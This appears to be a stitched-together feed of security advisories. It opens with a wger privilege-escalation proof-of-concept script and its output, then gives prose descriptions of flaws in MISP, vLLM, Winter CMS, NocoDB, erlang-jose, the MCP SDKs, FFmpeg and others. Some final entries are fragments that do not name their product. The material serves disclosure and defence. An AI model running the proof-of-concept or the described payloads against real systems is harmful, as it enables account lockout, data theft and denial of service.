    edit_user = get_object_or_404(User, pk=self.kwargs['pk'])
    if (
        request.user.has_perm('gym.manage_gym')
        or request.user.has_perm('gym.gym_trainer')
    ) and edit_user.userprofile.gym_id != request.user.userprofile.gym_id:
        return HttpResponseForbidden()
    # NO check: is the target user more privileged than the requester?
    return super().dispatch(request, *args, **kwargs)
```

There is **no check** preventing a trainer from targeting a manager. The same vulnerability exists in `UserActivateView` (line 415).

An additional contributing factor: `get_permission_list()` in `wger/gym/helpers.py` (line 102) **always** includes `'trainer'` in the assignable roles, meaning any gym manager can create trainer accounts -- which can then deactivate the manager who created them.

### PoC

#### Prerequisites

- A gym with at least two users: one with `gym_manager` role (victim) and one with `gym_trainer` role (attacker)
- Both users belong to the same gym

#### Attack Steps

```
# As the trainer, simply visit:
GET /en/user/<manager_user_id>/deactivate
```

The manager's account is immediately set to `is_active = False`. The manager can no longer log in.

#### Proof of Concept Script

```python
#!/usr/bin/env python3
"""
PoC: Trainer -> Manager Privilege Escalation (Account Deactivation)
Target: wger Workout Manager
Severity: HIGH - CVSS 6.5
CWE-269: Improper Privilege Management

Usage:
    python3 poc.py http://localhost:8000
"""

import requests
import sys
import re

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <BASE_URL>")
    print(f"Example: {sys.argv[0]} http://localhost:8000")
    sys.exit(1)

BASE = sys.argv[1].rstrip("/")
API = f"{BASE}/api/v2"

MANAGER_USER = "gym_manager_poc"
MANAGER_PASS = "Manager!Poc!2025"
TRAINER_USER = "evil_trainer_poc"
TRAINER_PASS = "Trainer!Poc!2025"

BANNER = """
=====================================================================
  PoC: Trainer -> Manager Privilege Escalation
  Severity: HIGH
  CWE-269: Improper Privilege Management
=====================================================================
"""
print(BANNER)


# ---- Helper ----
def api_login(username, password):
    r = requests.post(f"{API}/login/", json={
        "username": username, "password": password
    })
    if r.status_code == 200:
        return r.json().get("token")
    return None

def api_headers(token):
    return {"Authorization": f"Token {token}", "Content-Type": "application/json"}


# ---- Setup via Django ORM (must run inside container) ----

import os, django
os.environ['DJANGO_SETTINGS_MODULE'] = 'settings.main'
sys.path.insert(0, '/home/wger/src')
django.setup()

from django.contrib.auth.models import User, Group
from wger.gym.models import Gym

# Ensure permission groups exist
for name in ['gym_member', 'gym_trainer', 'gym_manager', 'general_gym_manager']:
    Group.objects.get_or_create(name=name)

# Create gym
gym, _ = Gym.objects.get_or_create(name="PoC Test Gym")
print(f"[*] Gym: {gym.name} (id={gym.id})")

# Create manager (the VICTIM)
manager, created = User.objects.get_or_create(
    username=MANAGER_USER,
    defaults={"is_active": True}
)
if created:
    manager.set_password(MANAGER_PASS)
    manager.save()
manager.userprofile.gym = gym
manager.userprofile.save()
manager.groups.clear()
manager.groups.add(Group.objects.get(name='gym_manager'))
manager.is_active = True
manager.save()
print(f"[*] Manager (victim): {manager.username} (id={manager.id})")
print(f"    Groups: {[g.name for g in manager.groups.all()]}")
print(f"    is_active: {manager.is_active}")

# Create trainer (the ATTACKER)
trainer, created = User.objects.get_or_create(
    username=TRAINER_USER,
    defaults={"is_active": True}
)
if created:
    trainer.set_password(TRAINER_PASS)
    trainer.save()
trainer.userprofile.gym = gym
trainer.userprofile.save()
trainer.groups.clear()
trainer.groups.add(Group.objects.get(name='gym_trainer'))
print(f"[*] Trainer (attacker): {trainer.username} (id={trainer.id})")
print(f"    Groups: {[g.name for g in trainer.groups.all()]}")


# ---- 1. Verify manager is active BEFORE attack ----

manager.refresh_from_db()
print(f"\n[*] Manager is_active BEFORE attack: {manager.is_active}")
assert manager.is_active, "Manager should be active before test"


# ---- 2. ATTACK: Trainer deactivates manager ----

print(f"\n{'='*65}")
print(f"  ATTACK: Trainer deactivating gym manager account")
print(f"{'='*65}")

from django.test import Client
c = Client()
c.force_login(trainer)
resp = c.get(f"/en/user/{manager.id}/deactivate", follow=True)
print(f"\n  GET /en/user/{manager.id}/deactivate")
print(f"  (Logged in as: {TRAINER_USER} - gym_trainer only)")
print(f"  Response: HTTP {resp.status_code}")


# ---- 3. VERIFY ----

print(f"\n{'='*65}")
print(f"  VERIFICATION")
print(f"{'='*65}")

manager.refresh_from_db()
print(f"\n  Manager is_active AFTER attack: {manager.is_active}")

if not manager.is_active:
    print("""
  +----------------------------------------------------------+
  |  VULNERABILITY CONFIRMED                                 |
  |                                                          |
  |  A gym_trainer successfully deactivated a gym_manager!   |
  |  No privilege hierarchy check prevents this.             |
  |  The trainer can now lock out all managers from the gym.  |
  +----------------------------------------------------------+
""")
    manager.is_active = True
    manager.save()
    print("  [+] Cleanup: Manager re-activated")
else:
    print("\n  Manager is still active - NOT vulnerable")
```

#### Proof of Concept Output

```
=====================================================================
  PoC: Trainer -> Manager Privilege Escalation
  Severity: HIGH
  CWE-269: Improper Privilege Management
=====================================================================

[*] Gym: PoC Test Gym (id=2)
[*] Manager (victim): gym_manager_poc (id=4)
    Groups: ['gym_manager']
    is_active: True
[*] Trainer (attacker): evil_trainer_poc (id=5)
    Groups: ['gym_trainer']

[*] Manager is_active BEFORE attack: True

=================================================================
  ATTACK: Trainer deactivating gym manager account
=================================================================

  Trainer login: HTTP 200
  GET http://localhost/en/user/4/deactivate
  (Logged in as: evil_trainer_poc - gym_trainer only)
  Response: HTTP 200

=================================================================
  VERIFICATION
=================================================================

  Manager is_active AFTER attack: False

  +----------------------------------------------------------+
  |  VULNERABILITY CONFIRMED                                 |
  |                                                          |
  |  A gym_trainer successfully deactivated a gym_manager!   |
  |  No privilege hierarchy check prevents this.             |
  |  The trainer can now lock out all managers from the gym.  |
  +----------------------------------------------------------+

  [+] Cleanup: Manager re-activated
```

### Impact

1. **Gym Management Lockout:** A trainer can deactivate every manager account in their gym, effectively seizing control of the gym's administrative functions.
2. **Denial of Service:** Deactivated managers cannot log in, manage members, or perform any administrative tasks until a `general_gym_manager` (superadmin) or a Django superuser manually re-activates their accounts.
3. **Abuse Chain:** Since `get_permission_list()` always includes `'trainer'` in assignable roles, any manager can unknowingly create the account that will later lock them out.


### Fix

Add a privilege hierarchy check in `UserDeactivateView.dispatch()` and `UserActivateView.dispatch()`:

```python
# File: wger/core/views/user.py, inside dispatch() of both views

edit_user = get_object_or_404(User, pk=self.kwargs['pk'])

# Trainers must not deactivate/activate managers or other trainers
if request.user.has_perm('gym.gym_trainer') and not (
    request.user.has_perm('gym.manage_gym')
    or request.user.has_perm('gym.manage_gyms')
):
    if (
        edit_user.has_perm('gym.manage_gym')
        or edit_user.has_perm('gym.manage_gyms')
        or edit_user.has_perm('gym.gym_trainer')
    ):
        return HttpResponseForbidden()
```

MISP contains a vulnerability in its server settings lookup mechanism that allows an authenticated user to retrieve sensitive configuration data that should have been redacted.

The settings lookup function resolves a dotted setting name to a node in the configuration tree. When a branch name (such as Security, MISP, or Plugin) is supplied instead of a specific leaf setting, the function returns the entire sub-tree. Because a branch node does not carry a redaction flag, the redaction check in the settings retrieval endpoint is bypassed, and the full branch contents are returned to the caller. This exposes sensitive values including the security salt, Redis connection passwords, and plugin API keys.

A second endpoint that edits server settings similarly reads the entire configuration store when a branch name is resolved, returning all settings to the caller.

The impact is disclosure of sensitive server configuration secrets to any user who can access the server settings endpoints.

Affected versions: <2.5.48.

obsidian-tc is a governed, agent-ready Model Context Protocol server for Obsidian vaults. From 1.0.1 until 1.31.4, `create_entity`, `link_entities`, `rename_entity`, `unlink_entities` and `delete_entity` regenerate memory notes from SQLite at the computed `memory/<type>/<name>.md` path without reliably preserving note ownership or the consistency of a failed lifecycle operation. During shared materialization, a hand-authored note or an orphan left by a different entity whose name sanitized to the same path could have its entire body overwritten on the next write naming that type and name, with non-owned frontmatter preserved. `rename_entity` also seeded the destination path with a direct atomic write without validating ownership and could overwrite a foreign note there. Separately, several tools mutated SQLite before fallible filesystem work: `create_entity` and `link_entities` inserted the row or relation before materialization; `rename_entity` updated the entity, including a retired status, before updating its note; `unlink_entities` removed a relation before rematerializing the source note; and `delete_entity`'s cascade removed the target and its relations before rematerializing neighbouring notes. A later filesystem failure could therefore leave a row or relation changed and the memory graph inconsistent with the notes on disk even when the operation failed. An authorized caller with the required memory-tool permissions could, without intending to, destroy the body of a vault note outside the entity being written; `delete_entity` additionally requires its deletion permission and destructive confirmation, which this memory flaw does not bypass. Snapshots-before-write through `restore_note` mitigate the overwrite only where snapshots are enabled and the note had previously been written through obsidian-tc. This issue is fixed in version 1.31.4.

ProxySQL is a proxy for MySQL and its forks, as well as PostgreSQL. Prior to 3.0.10, 3.1.10, and 4.0.10, decompress_mysql_payload() in lib/mysql_data_stream.cpp accepts a zlib stream when uncompress() returns Z_OK without checking that the actual output length equals the attacker-controlled payload_length. An authenticated MySQL client that negotiates compression can overstate payload_length, causing buffer2array() to parse the uninitialized tail of a heap buffer as MySQL packet headers and forward stale data to the backend. Backend error responses can disclose prior SQL queries, result data, credentials, or session state, and malformed lengths can also cause excessive allocations. This issue is fixed in versions 3.0.10, 3.1.10, and 4.0.10.

In SAP/astonish, an authenticated user could potentially identify and operate on another team�s sandbox containers because of improper tenant isolation in the legacy Incus sandbox-management API handlers. The affected handlers did not use the tenant-aware session lookup path, allowing cross-tenant container operations such as listing, exposing or proxying, and deleting containers.The issue affects only the legacy Incus backend. Kubernetes and OpenShell deployments are not affected because the relevant Incus-specific handlers are unavailable there.

The Elasticsearch data source resource proxy forwards the request method and path to Elasticsearch using the data source's own credentials, without restricting them to the operations the plugin needs. A user who can query the data source can alter index mappings or reach other indices on the cluster. [Improper authorization / path validation]

OpenEMR before 8.5.0 contains a stored cross-site scripting vulnerability in the Eye Exam (eye_mag) module that allows administrators to inject JavaScript through unencoded Eye_defaults list option titles. Attackers can store a crafted title via edit_list.php that breaks out of a jQuery string in eye_base.php, executing script in any authenticated user's session when they click Defaults.

Vulnerability in the MySQL Server, MySQL Cluster product of Oracle MySQL (component: Server: GIS).  Supported versions that are affected are MySQL Server: 8.4.0-8.4.13, 9.7.0-9.7.4, 26.10; MySQL Cluster: 8.0.0-8.0.50, 8.4.0-8.4.13, 9.7.0-9.7.4 and  26.10. Easily exploitable vulnerability allows low privileged attacker with network access via multiple protocols to compromise MySQL Server, MySQL Cluster.  Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server, MySQL Cluster and  unauthorized read access to a subset of MySQL Server, MySQL Cluster accessible data. CVSS 3.1 Base Score 7.1 (Confidentiality and Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:H).

NocoDB before 2026.10.1 contains a credential exposure vulnerability in the connection-test endpoint that allows authorized integration users to redirect stored credentials by overriding connection host, port, and user fields. Attackers can point the test at a server they control to capture offline-crackable PostgreSQL md5 or MySQL handshakes and recover the stored database password.

NocoDB before 2026.08.0 contains an sql injection vulnerability that allows authenticated Creator or Owner users to execute database functions by supplying zero-argument function calls as column default values. Attackers can plant functions like version() or inet_server_addr() in PostgreSQL or MySQL column definitions and read results through record APIs, disclosing server addresses, role names, and engine details.

ArcadeDB before 26.11.1 contains an authorization bypass vulnerability that allows authenticated users to read schema definitions of denied types through listings ignoring per-type ACLs. Attackers can query the PostgreSQL wire catalog, GraphQL introspection, or MCP get_schema to reveal property names, indexes, inheritance, and materialized view SQL.

Winter CMS is a content management system built on the Laravel PHP framework. Prior to 1.2.14, BrandSetting::renderCss() and EditorSetting::renderCss() store raw LESS compiler output with Cache::forever() but apply strip_tags() only to the value returned on a cache miss. The first render after saving custom CSS appears sanitized while priming an unsafe cache entry, and later cache hits return unsanitized output into the backend style element, allowing a user with backend.manage_branding or backend.manage_editor to cause stored cross-site scripting when another backend page renders the styles. The styles also appear on unauthenticated backend sign-in, password restore, and password reset layouts. This issue is fixed in version 1.2.14.

Winter CMS is a content management system built on the Laravel PHP framework. From 1.0.420 until 1.2.14, the backend Table widget partial modules/backend/widgets/table/partials/_table.php emits the search query parameter without HTML encoding inside a script template. A script-closing sequence in a crafted top-level GET URL terminates the raw-text template and causes the remaining input to be parsed as backend markup, even when the widget uses searching: false. Any Table or DataTable page is a sink, including the core Editor Settings route /backend/system/settings/update/winter/backend/editor, and an unauthenticated attacker can induce an authorized backend user to follow the link. Script executing in the victim's backend origin can read the CSRF token and issue credentialed requests with that user's permissions. For the core sink, a victim with backend.manage_editor, normally a Developer-role user or superuser, can edit CMS templates, so the injected script can conditionally chain to server-side code execution; this does not grant permissions the victim lacks and does not apply automatically to every third-party plugin sink. This issue is fixed in version 1.2.14.

items.title: Incomplete CVE-2026-34755 remediation can be bypassed by request-level num_frames
items.description:
### Summary

The frame-count protection added by PR #38636 for GHSA-pq5c-rjhq-qp7p / CVE-2026-34755 is incomplete in vLLM v0.19.0 through v0.27.1 and current `main` at commit `6c95a641e95c0faa6f3aa802d1fd3cce3f3bc3ce`.

An inference client can set `media_io_kwargs.video.num_frames=-1` in a stock `ChatCompletionRequest`. The production merge lets that request value replace the engine-level frame setting. `VideoMediaIO.load_base64("video/jpeg", ...)` treats a negative value as unlimited and decodes every comma-separated JPEG frame before combining them with `np.stack`.

In a safe exact-path reproduction, the same 256-frame payload loaded 8 frames when the server value was 8, but all 256 frames when the request supplied `-1`. This restores request-controlled, linearly scalable memory allocation at the same decoder addressed by the parent advisory. I assess the issue as Moderate (CVSS 3.1: 6.5). The safe run demonstrates the limit bypass and allocation growth; it does not claim a reproduced service crash or RCE.

### Details

The request field is exposed without a numeric security bound in [`ChatCompletionRequest`](https://github.com/vllm-project/vllm/blob/6c95a641e95c0faa6f3aa802d1fd3cce3f3bc3ce/vllm/entrypoints/openai/chat_completion/protocol.py#L364-L370). `ChatParams.with_defaults()` performs the engine/request merge ([`renderers/params.py`](https://github.com/vllm-project/vllm/blob/6c95a641e95c0faa6f3aa802d1fd3cce3f3bc3ce/vllm/renderers/params.py#L99-L122)), and the base merge gives runtime values precedence ([`media/base.py`](https://github.com/vllm-project/vllm/blob/6c95a641e95c0faa6f3aa802d1fd3cce3f3bc3ce/vllm/multimodal/media/base.py#L65-L80)).

`VideoMediaIO.merge_kwargs()` removes unsafe request-level GPU backend settings but does not reject or clamp `num_frames` ([`media/video.py`](https://github.com/vllm-project/vllm/blob/6c95a641e95c0faa6f3aa802d1fd3cce3f3bc3ce/vllm/multimodal/media/video.py#L28-L66)). The resulting value reaches the following decoder branch ([`media/video.py`](https://github.com/vllm-project/vllm/blob/6c95a641e95c0faa6f3aa802d1fd3cce3f3bc3ce/vllm/multimodal/media/video.py#L103-L121)):

```python
if self.num_frames > 0:
    frame_parts = data.split(",", self.num_frames)[: self.num_frames]
elif self.num_frames == 0:
    raise ValueError("num_frames must be greater than 0 or -1")
else:
    frame_parts = data.split(",")

frames = np.stack(
    [np.asarray(load_frame(frame_data)) for frame_data in frame_parts]
)
```

The effective policy is therefore:

```text
server value:  {"video": {"num_frames": 8}}
request value: {"video": {"num_frames": -1}}
effective:     {"video": {"num_frames": -1}}
```

The source-traced actor-to-sink chain is:

```text
POST /v1/chat/completions
  -> ChatCompletionRequest.media_io_kwargs
  -> ChatCompletionRequest.build_chat_params()
  -> ChatParams.with_defaults()
  -> merge_media_io_kwargs() / VideoMediaIO.merge_kwargs()
  -> MediaConnector data-URL handling
  -> VideoMediaIO.load_base64("video/jpeg", ...)
  -> all-frame JPEG decode and np.stack
```

The `-1` sentinel is an intentional “all frames” sampling preference and was shown in the runtime API example for PR #34778. PR #38636 also retained a negative-value unlimited test. This report does not claim that the sentinel itself is new. The security issue is the absence of a trust separation between an operator preference and the server-side ceiling introduced to remediate GHSA-pq5c. A low-privilege request can disable that ceiling. A very large positive request value has the same policy problem because the client selects the effective maximum.

`VLLM_MAX_IMAGE_PIXELS` applies independently to each JPEG and does not bound aggregate frames or decoded pixels. Downstream model limits run after media loading and cannot prevent the split, per-frame allocations, and combined stack.

The report confirmed this behavior in v0.27.1 (`6e448d0ea9bf3d88d898b65449ca6dc2aec170ac`) and the then-current main revision. The online request-boundary fix is available in v0.31.0.

The recommended fix is a positive server-enforced maximum frame or aggregate decoded-work budget that is independent of request and startup sampling preferences. On the online API, request `num_frames <= 0` and values above the maximum should be rejected or mapped to the server limit.

### Impact

This is an availability/resource-exhaustion issue affecting deployments that expose a video-capable multimodal model to inference clients. An actor who can submit a video request can replace the operator's frame setting with `-1` or an attacker-selected large value. Memory consumption then scales with every supplied frame, including individual decoded frame arrays and the combined `np.stack` allocation.

If `--api-key` is configured, the actor needs a valid inference API key. Without a configured key, the stock `/v1/chat/completions` route has no API-key middleware. I retain the parent advisory's conservative `PR:L` vector.

In a memory-constrained deployment, a sufficiently large request can cause allocation failure or API/renderer process termination through container or host OOM handling. The retained safe run does not itself demonstrate a service crash. No confidentiality, integrity, or code-execution impact is claimed.

## Affected versions

- Package: `vllm` (PyPI).
- Affected versions: `>= 0.19.0, < 0.31.0`.
- First stable patched version: `0.31.0`.

PR #58830 blocks untrusted per-request `mm_processor_kwargs` and `media_io_kwargs` by default before preprocessing. Keep `--trust-request-mm-kwargs` disabled for untrusted clients. Explicitly enabling it restores trusted override behavior; the underlying processor/sampler is not independently bounded by this fix.

Advisory fixed in [#58830](https://github.com/vllm-project/vllm/pull/58830).

vLLM is an inference and serving engine for large language models. Prior to 0.32.0, the Phi-4 multimodal audio encoder in phi4mm_audio.py and phi4mm_utils.py uses eager attention by default, allowing a remote client to submit one legal long audio clip that causes MultiHeadedAttention.forward_attention to materialize and retain full attention matrices in self.attn. The scaled dot-product attention branch does not materialize these matrices. The resulting quadratic GPU-memory use can cause an out-of-memory condition and terminate EngineCore for all users. This issue is fixed in version 0.32.0.

FFmpeg before 9.1 contains a stack out-of-bounds read vulnerability in ff_h264_parse_framesize() in libavformat/rtpdec_h264.c when parsing an SDP a=framesize attribute lacking a height. Attackers controlling an RTSP server DESCRIBE response or a crafted .sdp file can make atoi() read past the line buffer, crashing clients or parsing stale stack bytes.

FFmpeg before 9.1 contains an integer overflow vulnerability in the split_planes size check of write_packet() in libavformat/img2enc.c that allows out-of-bounds heap reads. Attackers can supply a crafted input whose rawvideo stream declares very large width and height, remuxed into .y image files, to leak heap memory into output files or crash the application.

FFmpeg before 9.1 contains an out-of-bounds write vulnerability in build_frame_code() in libavformat/nutenc.c that allows attackers to corrupt the header_len[] array by supplying inputs with many audio streams. Attackers can remux a crafted input with many audio streams to NUT, causing out-of-bounds reads past static header tables and crashing the application.

FFmpeg before 9.1 contains an out-of-bounds read vulnerability in mxf_write_d10_audio_packet() in libavformat/mxfenc.c because mxf_init() accepts unsupported D-10 audio codecs. Attackers can supply a crafted input with a non-PCM multichannel audio stream remuxed to D-10 MXF to leak heap memory into the output file or crash the application.

FFmpeg before 9.1 contains a heap out-of-bounds read vulnerability in the curves filter in libavfilter/vf_curves.c that allows attackers to read past lookup tables by supplying planar high bit depth samples exceeding the nominal depth. Attackers can craft video files with unmasked gbrp9 to gbrp14 samples passed through the rawvideo decoder to crash applications or leak heap contents into output video.

Improper Handling of Highly Compressed Data (Data Amplification) vulnerability in silviucpp ezstd allows an attacker who supplies a zstd frame to ezstd:decompress_using_ddict/2 to exhaust memory and terminate the Erlang VM via a small frame that declares a very large content size.

zstd_nif_decompress_using_ddict in c_src/ezstd_nif.cc reads the frame's declared content size with ZSTD_getFrameContentSize and passes it directly to enif_make_new_binary, without the 1 GiB MAX_BUFFER_SIZE check that ezstd:decompress/1 applies before allocating. A valid 65,550-byte frame of RLE blocks declaring 2 GiB is rejected by ezstd:decompress/1 but is fully allocated and decompressed by the dictionary path. The allocation happens inside a NIF, so when it exceeds the memory available to the VM the operating system kills the whole node rather than the calling process.

This issue affects ezstd: from 1.0.5 before 1.2.5.

Improper Handling of Highly Compressed Data (Data Amplification) vulnerability in potatosalad jose (erlang-jose) allows a remote attacker to exhaust a node's memory with a small crafted JWE token.

The jose_jwe_zip:uncompress/2 function in src/jwe/jose_jwe_zip.erl decompresses the DEFLATE-compressed plaintext of a JWE that carries the optional zip: DEF header by calling zlib:inflate/2 on the entire attacker-controlled stream, with no bound on the output size or the inflation ratio. Raw DEFLATE reaches ratios around 1000:1 on highly repetitive input, so a few-kilobyte token inflates to hundreds of megabytes or gigabytes in a single call.

Decompression runs automatically during decryption through jose_jwe:block_decrypt/2 (JOSE.JWE.block_decrypt/2 in Elixir), before the recipient can inspect or reject the payload. With the common asymmetric key-management algorithms (RSA-OAEP, ECDH-ES) an attacker needs only the recipient's public key to craft such a token, so no authentication or secret material is required. A single small token can exhaust the node's memory and crash the BEAM, denying service to all users.

This issue affects jose: from 1.0.0 before 1.11.13.

The Model Context Protocol TypeScript SDK provides TypeScript client and server implementations of the Model Context Protocol. From 1.6.0 until 1.32.0 in @modelcontextprotocol/sdk, from 2.0.0 until 2.3.0 in @modelcontextprotocol/server, from 2.0.0 until 2.0.2 in @modelcontextprotocol/express, and from 2.0.0 until 2.3.1 in @modelcontextprotocol/server-legacy, server-side bearer authentication could accept a valid access token issued for a different service because the SDK did not enforce the token audience. The affected surface is server-side HTTP bearer authentication. The trigger is a valid token whose audience names another service. The authorization server must issue tokens for multiple services, and the application's verifyAccessToken() must not independently validate aud. Applications already validating aud inside verifyAccessToken() are not affected. An attacker with a token for another service could authenticate to the MCP server and obtain the confidentiality and integrity capabilities granted to an authenticated caller. Upgrading alone leaves the new audience validation disabled. Operators must enable audience validation and provide the token audience together. Enabling only the expected audience check causes every request to receive HTTP 401. This issue is fixed in @modelcontextprotocol/sdk 1.32.0, @modelcontextprotocol/server 2.3.0, @modelcontextprotocol/express 2.0.2, and @modelcontextprotocol/server-legacy 2.3.1.

The Model Context Protocol Python SDK is the official Python SDK for Model Context Protocol servers and clients. From 1.10.0 until 1.30.0 and 2.2.0, server-side bearer authentication configured through AuthSettings with token_verifier accepts a valid token issued for another service when the authorization server serves multiple resources and the TokenVerifier does not independently validate the aud audience. This resource-confusion flaw lets a token holder authenticate to the wrong MCP server and exercise that token's resulting access. This issue is fixed in versions 1.30.0 and 2.2.0.

FFmpeg before 9.1 contains a NULL pointer dereference vulnerability in the AVIF muxer in libavformat/movenc.c that allows attackers to crash the application through streams with unknown pixel formats. Attackers can supply a crafted input whose video stream is stream-copied to AVIF, causing unchecked av_pix_fmt_desc_get() results to be dereferenced, resulting in denial of service.

FFmpeg 7.0 before 9.1 contains an out-of-bounds read vulnerability in dvdvideo_audio_stream_add_all() in libavformat/dvdvideodec.c when parsing menu audio streams. Attackers can supply a crafted DVD image whose menu IFO declares more than 8 audio streams, reading past the audio_control array and crashing applications.

FFmpeg 9.0 before 9.1 contains a NULL pointer dereference vulnerability in dash_read_header() in libavformat/dashdec.c when building LCEVC stream groups without checking for a missing codecs string. Attackers can supply a crafted MPD manifest with a representation declaring a dependencyId but no codecs attribute to crash applications using the DASH demuxer.

FFmpeg before 9.1 contains an infinite loop vulnerability in ff_rtp_send_vc2hq() in libavformat/rtpenc_vc2hq.c that accepts a Dirac next parse offset of zero. Attackers can supply crafted Dirac/VC-2 video remuxed to the RTP muxer, causing the parsing pointer to never advance and consume CPU indefinitely.

Attackers can craft a DVD image whose last cell sector and NAV next-VOBU pointer bypass the end-of-cell check, overreading pgc->cell_playback and crashing the process.

FFmpeg 8.1 through 9.0.2 contains a memory exhaustion vulnerability in the libavcodec/exif.c parser that allows attackers to amplify allocations by pointing many IFD entries at overlapping payloads. Attackers can embed a small crafted EXIF block in TIFF, JPEG, PNG or WebP images to trigger quadratic memory allocation, causing denial of service in decoding applications.

Attackers can supply a crafted ADX/AAX stream with mid-stream new-extradata side data carrying an invalid sample rate, causing adx_decode() to write through NULL plane pointers and crash the application.

Attackers can craft a G2M3/G2M4 stream with a short Kempf palette so kempf_restore_buf() copies uninitialized stack bytes, including pointers or stack guards, into decoded output.
